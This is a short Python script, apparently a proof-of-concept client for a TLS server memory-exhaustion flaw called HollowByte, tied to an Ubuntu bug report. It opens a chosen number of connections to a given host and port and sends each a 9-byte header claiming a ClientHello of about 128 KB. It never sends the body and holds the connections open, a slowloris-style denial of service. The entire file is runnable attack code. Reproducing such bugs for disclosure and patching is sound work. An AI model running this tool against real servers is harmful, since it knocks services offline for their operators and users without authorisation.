#!/usr/bin/env python3 -I
"""HollowByte (Ubuntu LP: #2161371) client: opens N TCP connections to a TLS
server and sends on each only a TLS record header plus a 4 byte handshake
header that *claims* a huge ClientHello (default 131072 bytes, just below the
server's CLIENT_HELLO_MAX_LENGTH of 131396) - 9 bytes in total - then never
sends the body and keeps the connections open for HOLD seconds.

usage: hb_client.py HOST PORT COUNT [CLAIMED_LEN] [HOLD_SECONDS] [DELAY_BEFORE_HEADER]
"""
import socket, struct, sys, time

host = sys.argv[1]; port = int(sys.argv[2]); count = int(sys.argv[3])
claimed = int(sys.argv[4]) if len(sys.argv) > 4 else 0x020000
hold = float(sys.argv[5]) if len(sys.argv) > 5 else 8.0
delay = float(sys.argv[6]) if len(sys.argv) > 6 else 2.0

# TLS record: type 22 (handshake), version 3.1, length 4
# handshake header: type 1 (ClientHello), 24-bit length = claimed
payload = bytes([0x16, 0x03, 0x01, 0x00, 0x04, 0x01]) + struct.pack(">I", claimed)[1:]
assert len(payload) == 9
print(f"[client] payload ({len(payload)} bytes): {payload.hex(' ')}  claimed ClientHello length = {claimed}", flush=True)

socks = []
for i in range(count):
    s = socket.create_connection((host, port), timeout=10)
    socks.append(s)
print(f"[client] {len(socks)} connections established, waiting {delay}s before sending the headers", flush=True)
time.sleep(delay)
for s in socks:
    s.sendall(payload)
print(f"[client] sent the 9 byte header on every connection; holding them open for {hold}s", flush=True)
time.sleep(hold)
for s in socks:
    try:
        s.close()
    except OSError:
        pass
print("[client] closed all connections", flush=True)
